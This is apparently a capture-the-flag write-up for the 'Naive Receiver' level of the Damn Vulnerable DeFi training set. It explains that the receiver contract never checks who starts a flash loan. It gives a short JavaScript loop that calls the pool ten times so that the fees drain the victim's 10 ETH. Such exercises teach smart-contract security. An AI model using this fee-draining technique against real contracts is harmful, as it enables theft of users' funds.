There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.

A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH.

Take all ETH out of the user’s contract. If possible, in a single transaction.

- [See the contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0/contracts/naive-receiver)
- [Complete the challenge](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v3.0.0/test/naive-receiver/naive-receiver.challenge.js)
___
## Solution:
As we can see in the file `FlashLoanReceiver.sol` in function `onFlashLoan`, the caller is not checked. It means, that we, as a player, can call this flash loan to receive the fee from receiver. 

We need to do it 10 times because of we need to drain hole receiver's budget. 

```js
const ETH = await pool.ETH();

for(let i = 0; i < 10; i++) {
	await pool.connect(player).flashLoan(receiver.address, ETH, 0, "0x");
}
```
